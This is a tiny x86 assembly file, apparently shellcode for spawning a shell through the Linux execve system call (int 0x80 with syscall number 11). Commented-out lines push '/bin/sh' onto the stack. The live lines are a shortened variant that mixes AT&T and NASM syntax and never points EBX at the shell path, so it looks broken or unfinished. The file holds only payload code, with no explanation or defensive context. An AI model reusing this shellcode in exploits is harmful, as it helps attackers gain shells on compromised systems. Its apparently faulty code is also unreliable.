section .text
    global _start

_start:
    ; mov    al,0xb   
    ; push   0x0068732f
    ; push   0x6e69622f
    ; mov    ebx,esp
    ; int    0x80
    cltd
    push   0xb
    pop    eax
    pusha
    pop    ecx
    int    0x80